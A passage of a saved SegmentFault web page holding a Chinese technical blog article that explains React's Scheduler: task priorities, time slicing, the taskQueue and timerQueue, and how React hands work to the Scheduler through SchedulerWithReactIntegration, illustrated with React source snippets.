.katex .fontsize-ensurer.reset-size8.size4 {
  font-size: 0.55555556em;
}
.katex .sizing.reset-size8.size5,
.katex .fontsize-ensurer.reset-size8.size5 {
  font-size: 0.625em;
}
.katex .sizing.reset-size8.size6,
.katex .fontsize-ensurer.reset-size8.size6 {
  font-size: 0.69444444em;
}
.katex .sizing.reset-size8.size7,
.katex .fontsize-ensurer.reset-size8.size7 {
  font-size: 0.83333333em;
}
.katex .sizing.reset-size8.size8,
.katex .fontsize-ensurer.reset-size8.size8 {
  font-size: 1em;
}
.katex .sizing.reset-size8.size9,
.katex .fontsize-ensurer.reset-size8.size9 {
  font-size: 1.2em;
}
.katex .sizing.reset-size8.size10,
.katex .fontsize-ensurer.reset-size8.size10 {
  font-size: 1.44027778em;
}
.katex .sizing.reset-size8.size11,
.katex .fontsize-ensurer.reset-size8.size11 {
  font-size: 1.72777778em;
}
.katex .sizing.reset-size9.size1,
.katex .fontsize-ensurer.reset-size9.size1 {
  font-size: 0.28935185em;
}
.katex .sizing.reset-size9.size2,
.katex .fontsize-ensurer.reset-size9.size2 {
  font-size: 0.34722222em;
}
.katex .sizing.reset-size9.size3,
.katex .fontsize-ensurer.reset-size9.size3 {
  font-size: 0.40509259em;
}
.katex .sizing.reset-size9.size4,
.katex .fontsize-ensurer.reset-size9.size4 {
  font-size: 0.46296296em;
}
.katex .sizing.reset-size9.size5,
.katex .fontsize-ensurer.reset-size9.size5 {
  font-size: 0.52083333em;
}
.katex .sizing.reset-size9.size6,
.katex .fontsize-ensurer.reset-size9.size6 {
  font-size: 0.5787037em;
}
.katex .sizing.reset-size9.size7,
.katex .fontsize-ensurer.reset-size9.size7 {
  font-size: 0.69444444em;
}
.katex .sizing.reset-size9.size8,
.katex .fontsize-ensurer.reset-size9.size8 {
  font-size: 0.83333333em;
}
.katex .sizing.reset-size9.size9,
.katex .fontsize-ensurer.reset-size9.size9 {
  font-size: 1em;
}
.katex .sizing.reset-size9.size10,
.katex .fontsize-ensurer.reset-size9.size10 {
  font-size: 1.20023148em;
}
.katex .sizing.reset-size9.size11,
.katex .fontsize-ensurer.reset-size9.size11 {
  font-size: 1.43981481em;
}
.katex .sizing.reset-size10.size1,
.katex .fontsize-ensurer.reset-size10.size1 {
  font-size: 0.24108004em;
}
.katex .sizing.reset-size10.size2,
.katex .fontsize-ensurer.reset-size10.size2 {
  font-size: 0.28929605em;
}
.katex .sizing.reset-size10.size3,
.katex .fontsize-ensurer.reset-size10.size3 {
  font-size: 0.33751205em;
}
.katex .sizing.reset-size10.size4,
.katex .fontsize-ensurer.reset-size10.size4 {
  font-size: 0.38572806em;
}
.katex .sizing.reset-size10.size5,
.katex .fontsize-ensurer.reset-size10.size5 {
  font-size: 0.43394407em;
}
.katex .sizing.reset-size10.size6,
.katex .fontsize-ensurer.reset-size10.size6 {
  font-size: 0.48216008em;
}
.katex .sizing.reset-size10.size7,
.katex .fontsize-ensurer.reset-size10.size7 {
  font-size: 0.57859209em;
}
.katex .sizing.reset-size10.size8,
.katex .fontsize-ensurer.reset-size10.size8 {
  font-size: 0.69431051em;
}
.katex .sizing.reset-size10.size9,
.katex .fontsize-ensurer.reset-size10.size9 {
  font-size: 0.83317261em;
}
.katex .sizing.reset-size10.size10,
.katex .fontsize-ensurer.reset-size10.size10 {
  font-size: 1em;
}
.katex .sizing.reset-size10.size11,
.katex .fontsize-ensurer.reset-size10.size11 {
  font-size: 1.19961427em;
}
.katex .sizing.reset-size11.size1,
.katex .fontsize-ensurer.reset-size11.size1 {
  font-size: 0.20096463em;
}
.katex .sizing.reset-size11.size2,
.katex .fontsize-ensurer.reset-size11.size2 {
  font-size: 0.24115756em;
}
.katex .sizing.reset-size11.size3,
.katex .fontsize-ensurer.reset-size11.size3 {
  font-size: 0.28135048em;
}
.katex .sizing.reset-size11.size4,
.katex .fontsize-ensurer.reset-size11.size4 {
  font-size: 0.32154341em;
}
.katex .sizing.reset-size11.size5,
.katex .fontsize-ensurer.reset-size11.size5 {
  font-size: 0.36173633em;
}
.katex .sizing.reset-size11.size6,
.katex .fontsize-ensurer.reset-size11.size6 {
  font-size: 0.40192926em;
}
.katex .sizing.reset-size11.size7,
.katex .fontsize-ensurer.reset-size11.size7 {
  font-size: 0.48231511em;
}
.katex .sizing.reset-size11.size8,
.katex .fontsize-ensurer.reset-size11.size8 {
  font-size: 0.57877814em;
}
.katex .sizing.reset-size11.size9,
.katex .fontsize-ensurer.reset-size11.size9 {
  font-size: 0.69453376em;
}
.katex .sizing.reset-size11.size10,
.katex .fontsize-ensurer.reset-size11.size10 {
  font-size: 0.83360129em;
}
.katex .sizing.reset-size11.size11,
.katex .fontsize-ensurer.reset-size11.size11 {
  font-size: 1em;
}
.katex .delimsizing.size1 {
  font-family: KaTeX_Size1;
}
.katex .delimsizing.size2 {
  font-family: KaTeX_Size2;
}
.katex .delimsizing.size3 {
  font-family: KaTeX_Size3;
}
.katex .delimsizing.size4 {
  font-family: KaTeX_Size4;
}
.katex .delimsizing.mult .delim-size1 > span {
  font-family: KaTeX_Size1;
}
.katex .delimsizing.mult .delim-size4 > span {
  font-family: KaTeX_Size4;
}
.katex .nulldelimiter {
  display: inline-block;
  width: 0.12em;
}
.katex .delimcenter {
  position: relative;
}
.katex .op-symbol {
  position: relative;
}
.katex .op-symbol.small-op {
  font-family: KaTeX_Size1;
}
.katex .op-symbol.large-op {
  font-family: KaTeX_Size2;
}
.katex .op-limits > .vlist-t {
  text-align: center;
}
.katex .accent > .vlist-t {
  text-align: center;
}
.katex .accent .accent-body {
  position: relative;
}
.katex .accent .accent-body:not(.accent-full) {
  width: 0;
}
.katex .overlay {
  display: block;
}
.katex .mtable .vertical-separator {
  display: inline-block;
  min-width: 1px;
}
.katex .mtable .arraycolsep {
  display: inline-block;
}
.katex .mtable .col-align-c > .vlist-t {
  text-align: center;
}
.katex .mtable .col-align-l > .vlist-t {
  text-align: left;
}
.katex .mtable .col-align-r > .vlist-t {
  text-align: right;
}
.katex .svg-align {
  text-align: left;
}
.katex svg {
  display: block;
  position: absolute;
  width: 100%;
  height: inherit;
  fill: currentColor;
  stroke: currentColor;
  fill-rule: nonzero;
  fill-opacity: 1;
  stroke-width: 1;
  stroke-linecap: butt;
  stroke-linejoin: miter;
  stroke-miterlimit: 4;
  stroke-dasharray: none;
  stroke-dashoffset: 0;
  stroke-opacity: 1;
}
.katex svg path {
  stroke: none;
}
.katex img {
  border-style: none;
  min-width: 0;
  min-height: 0;
  max-width: none;
  max-height: none;
}
.katex .stretchy {
  width: 100%;
  display: block;
  position: relative;
  overflow: hidden;
}
.katex .stretchy::before,
.katex .stretchy::after {
  content: "";
}
.katex .hide-tail {
  width: 100%;
  position: relative;
  overflow: hidden;
}
.katex .halfarrow-left {
  position: absolute;
  left: 0;
  width: 50.2%;
  overflow: hidden;
}
.katex .halfarrow-right {
  position: absolute;
  right: 0;
  width: 50.2%;
  overflow: hidden;
}
.katex .brace-left {
  position: absolute;
  left: 0;
  width: 25.1%;
  overflow: hidden;
}
.katex .brace-center {
  position: absolute;
  left: 25%;
  width: 50%;
  overflow: hidden;
}
.katex .brace-right {
  position: absolute;
  right: 0;
  width: 25.1%;
  overflow: hidden;
}
.katex .x-arrow-pad {
  padding: 0 0.5em;
}
.katex .x-arrow,
.katex .mover,
.katex .munder {
  text-align: center;
}
.katex .boxpad {
  padding: 0 0.3em 0 0.3em;
}
.katex .fbox,
.katex .fcolorbox {
  box-sizing: border-box;
  border: 0.04em solid;
}
.katex .cancel-pad {
  padding: 0 0.2em 0 0.2em;
}
.katex .cancel-lap {
  margin-left: -0.2em;
  margin-right: -0.2em;
}
.katex .sout {
  border-bottom-style: solid;
  border-bottom-width: 0.08em;
}
.katex-display {
  display: block;
  margin: 1em 0;
  text-align: center;
}
.katex-display > .katex {
  display: block;
  text-align: center;
  white-space: nowrap;
}
.katex-display > .katex > .katex-html {
  display: block;
  position: relative;
}
.katex-display > .katex > .katex-html > .tag {
  position: absolute;
  right: 0;
}
.katex-display.leqno > .katex > .katex-html > .tag {
  left: 0;
  right: auto;
}
.katex-display.fleqn > .katex {
  text-align: left;
  padding-left: 2em;
}
</style><link rel="stylesheet" type="text/css" href="./彻底搞懂React的调度机制原理_files/c2a527101433f11d.css"></head><body><div id="__next"><div class="d-none d-lg-block text-center"><div id="OA_holder_5" class="OA_holder" style="display:none"><div id="beacon_e42c2b93e2" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./彻底搞懂React的调度机制原理_files/lg.php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
</div></div><div class="position-fixed" style="top:58px;left:0;right:0;margin:auto;z-index:1056"><div class="toast-container top-0 start-50 translate-middle-x"></div></div><div id="root-top-container"></div><header data-bs-theme="light" class="sticky-top blog-header theme-light border-bottom" style="background-color: rgb(255, 255, 255); transform: translateY(0px);"><div class="container"><nav class="py-3 navbar navbar-expand-lg navbar-light"><div class="d-none d-lg-flex align-items-center w-50 me-auto"><a href="https://segmentfault.com/blogs" class="d-none d-md-block p-0 navbar-brand"><svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg" class="text-primary"><title>SF</title><path fill-rule="evenodd" clip-rule="evenodd" d="M8 0C3.58172 0 0 3.58172 0 8V20C0 24.4183 3.58172 28 8 28H20C24.4183 28 28 24.4183 28 20V8C28 3.58172 24.4183 0 20 0H8ZM13.73 11.9372C12.578 11.2873 11.2724 10.9592 9.95 10.9872C8.625 10.9872 5.535 11.3372 5.535 14.5872C5.535 16.4122 6.495 17.2622 7.935 17.9772C8.305 18.1622 8.655 18.3072 8.965 18.4322L8.96675 18.433C9.83592 18.7926 10.525 19.0778 10.525 19.8472C10.525 20.7222 9.715 21.0322 8.96 21.0322C7.93318 20.9427 6.96552 20.5134 6.21 19.8122L5.25 21.7322V21.9572C6.47366 22.8581 7.96081 23.3292 9.48 23.2972C11.175 23.2972 14.015 22.8422 14.015 19.6272C14.015 17.6272 13.065 16.8572 11.315 16.1272L10.67 15.8772C9.725 15.5222 8.98 15.2422 8.98 14.4522C8.98 13.9672 9.22 13.3872 10.38 13.3872C11.2483 13.3883 12.0951 13.6572 12.805 14.1572L13.73 12.1572V11.9372ZM22.92 5.75224C22.0842 5.39862 21.1823 5.22813 20.275 5.25224C18.635 5.25224 16.635 5.92724 16.635 9.14724C16.635 9.16319 16.6454 9.5817 16.6567 10.0374C16.6702 10.5821 16.685 11.18 16.685 11.2072C16.6839 11.2467 16.6678 11.2842 16.64 11.3122C16.611 11.3378 16.5737 11.352 16.535 11.3522H15.36L15.32 13.8922C15.4316 13.8922 15.5761 13.8878 15.7433 13.8827C15.973 13.8756 16.2456 13.8672 16.535 13.8672L16.5911 13.8777L16.64 13.9072C16.667 13.9358 16.683 13.973 16.685 14.0122C16.665 14.8782 16.653 16.325 16.6458 17.8134L16.642 18.7072C16.6393 19.4489 16.6377 20.1741 16.6366 20.8153L16.6357 21.5401L16.6354 21.8642L16.635 22.9722L20.2 22.9522C20.1997 22.8821 20.1992 22.7899 20.1987 22.6781C20.1954 21.9732 20.1884 20.4931 20.1781 18.9054L20.1684 17.515C20.1579 16.13 20.145 14.8097 20.13 13.9922C20.1281 13.9532 20.1426 13.9151 20.17 13.8872C20.199 13.8617 20.2363 13.8474 20.275 13.8472L20.5421 13.8565C20.9195 13.867 21.368 13.8705 21.7216 13.8717L22.16 13.8722L22.2 11.3322H20.275L20.2189 11.3218L20.17 11.2922C20.1436 11.2637 20.1292 11.2261 20.13 11.1872V9.62724C20.13 8.35724 20.46 7.81724 21.225 7.81724C21.5758 7.8304 21.9184 7.92634 22.225 8.09724L22.92 6.02724V5.75224Z" fill="currentColor"></path></svg></a><div class="d-none d-md-block" style="width:1px;height:1.75rem;background-color:rgba(33, 37, 41, 0.1)"></div><a href="https://segmentfault.com/blog/react-secret"><div class="d-flex align-items-center ms-md-3 text-body"><h4 class="mb-0">React的秘密</h4></div></a></div><div class="d-flex d-lg-none align-items-center justify-content-between w-100"><a href="https://segmentfault.com/blog/react-secret"><div class="d-flex align-items-center ms-lg-3 text-body"><h4 class="mb-0 text-truncate-1">React的秘密</h4></div></a><a role="button" tabindex="0" href="https://segmentfault.com/user/login" class="d-lg-none ms-2 flex-shrink-0 text-primary btn btn-link">注册登录</a></div><div class="w-100 navbar-collapse collapse" id="basic-navbar-nav"><div class="w-100 position-relative my-3 my-lg-0"><div class="d-none d-lg-flex w-100" style="max-width:432px;height:38px"><div class="d-flex align-items-center position-absolute h-100" style="margin-left:0.81rem"><i class="far fa-magnifying-glass text-body"></i></div><form class="flex-fill"><input placeholder="搜索博客关键字" aria-label="搜索" style="padding-left:2.3rem;background-color:rgba(33, 37, 41, 0.1)" type="text" class="border-0 shadow-none h-100 text-body form-control" value=""></form></div><div class="d-flex d-lg-none w-100"><div class="d-flex align-items-center position-absolute h-100" style="margin-left:0.81rem"><i class="far fa-magnifying-glass text-body"></i></div><form class="flex-fill"><input placeholder="搜索博客关键字" aria-label="搜索" style="padding-left:2.3rem;background-color:rgba(33, 37, 41, 0.1)" type="text" class="border-0 shadow-none h-100 text-body form-control" value=""></form></div></div><div class="p-0 ms-auto align-items-lg-center justify-content-end w-100 navbar-nav"><div class="me-2 me-md-0 nav-item"><a role="button" tabindex="0" href="https://segmentfault.com/a/1190000039101758#" class="me-3 btn btn-primary">关注博客</a><a role="button" tabindex="0" href="https://segmentfault.com/user/login" class="text-primary btn btn-link">注册登录</a></div></div></div></nav><nav class="sflex-center py-0 navbar navbar-expand navbar-light"><div class="navbar-nav"><div class="mx-1 nav-item"><a href="https://segmentfault.com/blog/react-secret" data-rr-ui-event-key="/blog/react-secret" class="nav-link">主页</a></div><div class="mx-1 nav-item"><a href="https://segmentfault.com/blog/react-secret/about" data-rr-ui-event-key="/blog/react-secret/about" class="nav-link">关于</a></div><div class="mx-1 nav-item"><a href="https://segmentfault.com/feeds/blog/react-secret" data-rr-ui-event-key="/feeds/blog/react-secret" class="nav-link">RSS</a></div></div></nav></div></header><style>
          html {
            scroll-behavior: unset !important;
            scroll-padding-top: 130px;
          }
        </style><div class="bg-white d-none d-xl-flex justify-content-center"><div id="OA_holder_2" class="OA_holder" style="display:none"><div id="beacon_a3fa38e41a" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./彻底搞懂React的调度机制原理_files/lg(1).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
</div></div><div class="bg-white py-5"><div class="pt-3 pt-sm-0 article-wrap container"><div class="row"><div class="mx-auto col-lg-7"><h1 class="h2 mb-3"><a href="https://segmentfault.com/a/1190000039101758" class="text-body">一篇长文帮你彻底搞懂React的调度机制原理</a></h1><div class="d-flex flex-wrap mb-4"><div class="d-flex align-items-center font-size-14"><div class="d-flex align-items-center"><a href="https://segmentfault.com/u/neronero"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-2" style="width:32px;height:32px"><img src="./彻底搞懂React的调度机制原理_files/4125048880-5d76f84e47ad4_huge128" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div></a><div class="d-flex flex-column"><a href="https://segmentfault.com/u/neronero"><div class="d-flex"><strong class="font-size-14">nero</strong><ul class="list-inline mb-0 authentication-info ms-1"></ul></div></a><a class="text-secondary" href="https://segmentfault.com/u/neronero"><div class="user-badge-wrap font-size-14 text-secondary"></div></a></div></div><a href="https://segmentfault.com/a/1190000039101758/revision" class="text-secondary font-size-14 ms-2 ps-1"><time datetime="2021-01-27T05:11:07.000Z" itemprop="datePublished">2021-01-27 </time></a><div class="ms-3 d-flex align-items-baseline text-secondary"><i class="far fa-book-open"></i><span class="ms-1">阅读 <!-- -->21<!-- --> 分钟</span></div></div></div></div></div><div class="row"><div class="d-none d-lg-flex justify-content-end align-items-start col-lg-2"><div class="sticky-outer-wrapper sticky-wrap functional-area-left justify-content-center me-0 ms-0 mt-0" style=""><div class="sticky-inner-wrapper" style="position: relative; transform: translate3d(0px, 0px, 0px);"><div role="group" class="align-items-center btn-group-vertical"><button type="button" aria-label="点赞" class="func-btn mainLike sflex-center shadow-sm rounded-circle main-lg-Like mb-0 btn btn-outline-primary"><i class="far fa-thumbs-up"></i></button><span class="text-primary fw-bold ">55</span><button type="button" aria-label="收藏" class="func-btn sflex-center rounded-circle  mt-2 btn btn-outline-secondary"><i class="far fa-bookmark"></i></button><a class="func-btn sflex-center btn btn-outline-secondary rounded-circle" href="https://segmentfault.com/a/1190000039101758#comment-area" aria-label="评论"><i class="far fa-message-lines"></i></a><div class="dropdown"><button type="button" id="actions-toggle" aria-expanded="false" aria-label="分享" class="func-btn nav-tab-item  rounded-pill btn btn-outline-secondary sflex-center rounded-circle dropdown-toggle btn btn-primary"><i class="far fa-share-nodes"></i></button></div></div></div></div><canvas hidden="" class="qrcode" height="164" width="164" style="height: 164px; width: 164px;"></canvas></div><div class="mx-auto col-lg-7"><div><div id="OA_holder_25" class="OA_holder" style="display: block;"><div id="beacon_9f9c935ad4" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./彻底搞懂React的调度机制原理_files/lg(2).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
</div><article class="article fmt article-content "><p><a target="_blank" href="https://link.segmentfault.com/?enc=8HZhRmVwVKKSDPB0%2F5dIqA%3D%3D.18E402%2Bwht%2BiEHrYw3N3dpTbA0cwGmVYixgWkwG6SP8VaTR93ctxptBmRU5FBZpMImY68BJmuuFrNH88S9nJIg%3D%3D">点击</a>进入React源码调试仓库。</p><p>Scheduler作为一个独立的包，可以独自承担起任务调度的职责，你只需要将任务和任务的优先级交给它，它就可以帮你管理任务，安排任务的执行。这就是React和Scheduler配合工作的模式。</p><p>对于多个任务，它会先执行优先级高的。对于单个任务，它会有节制地去执行。换句话说，线程只有一个，它不会一直占用着线程去执行任务。而是执行一会，中断一下，如此往复。用这样的模式，来避免一直占用有限的资源执行耗时较长的任务，解决用户操作时页面卡顿的问题，实现更快的响应。</p><p>我们可以从中梳理出Scheduler中两个重要的行为：<strong>多个任务的管理</strong>、<strong>单个任务的执行控制</strong>。</p><h2 id="item-1">基本概念</h2><p>为了实现上述的两个行为，它引入两个概念：<strong>任务优先级</strong> 、 <strong>时间片</strong>。</p><p>任务优先级让任务按照自身的紧急程度排序，这样可以让优先级最高的任务最先被执行到。</p><p>时间片规定的是单个任务在这一帧内最大的执行时间，任务一旦执行时间超过时间片，则会被打断，有节制地执行任务。这样可以保证页面不会因为任务连续执行的时间过长而产生卡顿。</p><h2 id="item-2">原理概述</h2><p>基于任务优先级和时间片的概念，Scheduler围绕着它的核心目标 - 任务调度，衍生出了两大核心功能：任务队列管理 和 时间片下任务的中断和恢复。</p><h3 id="item-2-1">任务队列管理</h3><p>任务队列管理对应了Scheduler的多任务管理这一行为。在Scheduler内部，把任务分成了两种：未过期的和已过期的，分别用两个队列存储，前者存到timerQueue中，后者存到taskQueue中。</p><p><strong>如何区分任务是否过期？</strong></p><p>用任务的开始时间（startTime）和当前时间（currentTime）作比较。开始时间大于当前时间，说明未过期，放到timerQueue；开始时间小于等于当前时间，说明已过期，放到taskQueue。</p><p><strong>不同队列中的任务如何排序？</strong></p><p>当任务一个个入队的时候，自然要对它们进行排序，保证紧急的任务排在前面，所以排序的依据就是任务的紧急程度。而taskQueue和timerQueue中任务紧急程度的判定标准是有区别的。</p><ul><li>taskQueue中，依据任务的过期时间（expirationTime）排序，过期时间越早，说明越紧急，过期时间小的排在前面。过期时间根据任务优先级计算得出，优先级越高，过期时间越早。</li><li>timerQueue中，依据任务的开始时间（startTime）排序，开始时间越早，说明会越早开始，开始时间小的排在前面。任务进来的时候，开始时间默认是当前时间，如果进入调度的时候传了延迟时间，开始时间则是当前时间与延迟时间的和。</li></ul><p><strong>任务入队两个队列，之后呢？</strong></p><p>如果放到了taskQueue，那么立即调度一个函数去循环taskQueue，挨个执行里面的任务。</p><p>如果放到了timerQueue，那么说明它里面的任务都不会立即执行，那就等到了timerQueue里面排在第一个任务的开始时间，看这个任务是否过期，如果是，则把任务从timerQueue中拿出来放入taskQueue，调度一个函数去循环它，执行掉里面的任务；否则过一会继续检查这第一个任务是否过期。</p><p>任务队列管理相对于单个任务的执行，是宏观层面的概念，它利用任务的优先级去管理任务队列中的任务顺序，始终让最紧急的任务被优先处理。</p><h3 id="item-2-2">单个任务的中断以及恢复</h3><p>单个任务的中断以及恢复对应了Scheduler的单个任务执行控制这一行为。在循环taskQueue执行每一个任务时，如果某个任务执行时间过长，达到了时间片限制的时间，那么该任务必须中断，以便于让位给更重要的事情（如浏览器绘制），等事情完成，再恢复执行任务。</p><p>例如这个<a target="_blank" href="https://link.segmentfault.com/?enc=JLST24qo4X0ql6sqd%2BkMlg%3D%3D.k3M09cIHwr93L6bnRoU3AL25g1iwKE02jDyWVdf0ehmBFAYlXnqfAToHfUx3e25mMmcShoFgz%2BRjly5D0OiURz%2FKQ2Do9n9QMoovyzx%2BKOVIPo20UP0gdXICGbx1%2BsWq74F2rYx8tqVfrVFvrz1EJA%3D%3D">例子</a>，点击按钮渲染140000个DOM节点，为的是让React通过scheduler调度一个耗时较长的更新任务。同时拖动方块，这是为了模拟用户交互。更新任务会占用线程去执行任务，用户交互要也要占用线程去响应页面，这就决定了它们两个是互斥的关系。在React的concurrent模式下，通过Scheduler调度的更新任务遇到用户交互之后，会是下面动图里的效果。</p><p><img referrerpolicy="no-referrer" src="./彻底搞懂React的调度机制原理_files/1460000039101761" alt="" title=""></p><p>执行React任务和页面响应交互这两件事情是互斥的，但因为Scheduler可以利用时间片中断React任务，然后让出线程给浏览器去绘制，所以一开始在fiber树的构建阶段，拖动方块会得到及时的反馈。但是后面卡了一下，这是因为fiber树构建完成，进入了同步的commit阶段，导致交互卡顿。分析页面的渲染过程可以非常直观地看到通过时间片的控制。主线程被让出去进行页面的绘制（Painting和Rendering，绿色和紫色的部分）。</p><p><img referrerpolicy="no-referrer" src="./彻底搞懂React的调度机制原理_files/1460000039101762" alt="" title="" loading="lazy"></p><p>Scheduler要实现这样的调度效果需要两个角色：<strong>任务的调度者、任务的执行者</strong>。调度者调度一个执行者，执行者去循环taskQueue，逐个执行任务。当某个任务的执行时间比较长，执行者会根据时间片中断任务执行，然后告诉调度者：我现在正执行的这个任务被中断了，还有一部分没完成，但现在必须让位给更重要的事情，你再调度一个执行者吧，好让这个任务能在之后被继续执行完（任务的恢复）。于是，调度者知道了任务还没完成，需要继续做，它会再调度一个执行者去继续完成这个任务。</p><p>通过执行者和调度者的配合，可以实现任务的中断和恢复。</p><h3 id="item-2-3">原理小结</h3><p>Scheduler管理着taskQueue和timerQueue两个队列，它会定期将timerQueue中的过期任务放到taskQueue中，然后让调度者通知执行者循环taskQueue执行掉每一个任务。执行者控制着每个任务的执行，一旦某个任务的执行时间超出时间片的限制。就会被中断，然后当前的执行者退场，退场之前会通知调度者再去调度一个新的执行者继续完成这个任务，新的执行者在执行任务时依旧会根据时间片中断任务，然后退场，重复这一过程，直到当前这个任务彻底完成后，将任务从taskQueue出队。taskQueue中每一个任务都被这样处理，最终完成所有任务，这就是Scheduler的完整工作流程。</p><p>这里面有一个关键点，就是执行者如何知道这个任务到底完成没完成呢？这是另一个话题了，也就是判断任务的完成状态。在讲解执行者执行任务的细节时会重点突出。</p><p>以上是Scheduler原理的概述，下面开始是对React和Scheduler联合工作机制的详细解读。涉及React与Scheduler的连接、调度入口、任务优先级、任务过期时间、任务中断和恢复、判断任务的完成状态等内容。</p><h2 id="item-3">详细流程</h2><p>在开始之前，我们先看一下React和Scheduler它们二者构成的一个系统的示意图。</p><p><img referrerpolicy="no-referrer" src="./彻底搞懂React的调度机制原理_files/1460000039101760" alt="" title="" loading="lazy"></p><p>整个系统分为三部分：</p><ul><li>产生任务的地方：React</li><li>React和Scheduler交流的翻译者：SchedulerWithReactIntegration</li><li>任务的调度者：Scheduler</li></ul><p>React中通过下面的代码，让fiber树的构建任务进入调度流程：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="scheduleCallback(
  schedulerPriorityLevel,
  performConcurrentWorkOnRoot.bind(null, root),
);" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-title function_">scheduleCallback</span>(
  schedulerPriorityLevel,
  performConcurrentWorkOnRoot.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root),
);</pre><p>任务通过翻译者交给Scheduler，Scheduler进行真正的任务调度，那么为什么需要一个翻译者的角色呢？</p><h3 id="item-3-4">React与Scheduler的连接</h3><p>Scheduler帮助React调度各种任务，但是本质上它们是两个完全不耦合的东西，二者各自都有自己的优先级机制，那么这时就需要有一个中间角色将它们连接起来。</p><p>实际上，在react-reconciler中提供了这样一个文件专门去做这样的工作，它就是<code>SchedulerWithReactIntegration.old(new).js</code>。它将二者的优先级翻译了一下，让React和Scheduler能读懂对方。另外，封装了一些Scheduler中的函数供React使用。</p><p>在执行React任务的重要文件<code>ReactFiberWorkLoop.js</code>中，关于Scheduler的内容都是从<code>SchedulerWithReactIntegration.old(new).js</code>导入的。它可以理解成是React和Scheduler之间的桥梁。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="// ReactFiberWorkLoop.js
import {
  scheduleCallback,
  cancelCallback,
  getCurrentPriorityLevel,
  runWithPriority,
  shouldYield,
  requestPaint,
  now,
  NoPriority as NoSchedulerPriority,
  ImmediatePriority as ImmediateSchedulerPriority,
  UserBlockingPriority as UserBlockingSchedulerPriority,
  NormalPriority as NormalSchedulerPriority,
  flushSyncCallbackQueue,
  scheduleSyncCallback,
} from &#39;./SchedulerWithReactIntegration.old&#39;;
" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-comment">// ReactFiberWorkLoop.js</span>
<span class="hljs-keyword">import</span> {
  scheduleCallback,
  cancelCallback,
  getCurrentPriorityLevel,
  runWithPriority,
  shouldYield,
  requestPaint,
  now,
  <span class="hljs-title class_">NoPriority</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">NoSchedulerPriority</span>,
  <span class="hljs-title class_">ImmediatePriority</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">ImmediateSchedulerPriority</span>,
  <span class="hljs-title class_">UserBlockingPriority</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">UserBlockingSchedulerPriority</span>,
  <span class="hljs-title class_">NormalPriority</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">NormalSchedulerPriority</span>,
  flushSyncCallbackQueue,
  scheduleSyncCallback,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'./SchedulerWithReactIntegration.old'</span>;
</pre><p><code>SchedulerWithReactIntegration.old(new).js</code>通过封装Scheduler的内容，对React提供两种调度入口函数：<code>scheduleCallback</code> 和 <code>scheduleSyncCallback</code>。任务通过调度入口函数进入调度流程。</p><p>例如，fiber树的构建任务在concurrent模式下通过<code>scheduleCallback</code>完成调度，在同步渲染模式下由<code>scheduleSyncCallback</code>完成。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="// concurrentMode
// 将本次更新任务的优先级转化为调度优先级
// schedulerPriorityLevel为调度优先级
const schedulerPriorityLevel = lanePriorityToSchedulerPriority(
  newCallbackPriority,
);
// concurrent模式
scheduleCallback(
  schedulerPriorityLevel,
  performConcurrentWorkOnRoot.bind(null, root),
);

// 同步渲染模式
scheduleSyncCallback(
  performSyncWorkOnRoot.bind(null, root),
)" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-comment">// concurrentMode</span>
<span class="hljs-comment">// 将本次更新任务的优先级转化为调度优先级</span>
<span class="hljs-comment">// schedulerPriorityLevel为调度优先级</span>
<span class="hljs-keyword">const</span> schedulerPriorityLevel = <span class="hljs-title function_">lanePriorityToSchedulerPriority</span>(
  newCallbackPriority,
);
<span class="hljs-comment">// concurrent模式</span>
<span class="hljs-title function_">scheduleCallback</span>(
  schedulerPriorityLevel,
  performConcurrentWorkOnRoot.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root),
);

<span class="hljs-comment">// 同步渲染模式</span>
<span class="hljs-title function_">scheduleSyncCallback</span>(
  performSyncWorkOnRoot.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root),
)</pre><p>它们两个其实都是对Scheduler中scheduleCallback的封装，只不过传入的优先级不同而已，前者是传递的是已经本次更新的lane计算得出的调度优先级，后者传递的是最高级别的优先级。另外的区别是，前者直接将任务交给Scheduler，而后者先将任务放到SchedulerWithReactIntegration.old(new).js自己的同步队列中，再将执行同步队列的函数交给Scheduler，以最高优先级进行调度，由于传入了最高优先级，意味着它将会是立即过期的任务，会立即执行掉它，这样能够保证在下一次事件循环中执行掉任务。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function scheduleCallback(
  reactPriorityLevel: ReactPriorityLevel,
  callback: SchedulerCallback,
  options: SchedulerCallbackOptions | void | null,
) {
  // 将react的优先级翻译成Scheduler的优先级
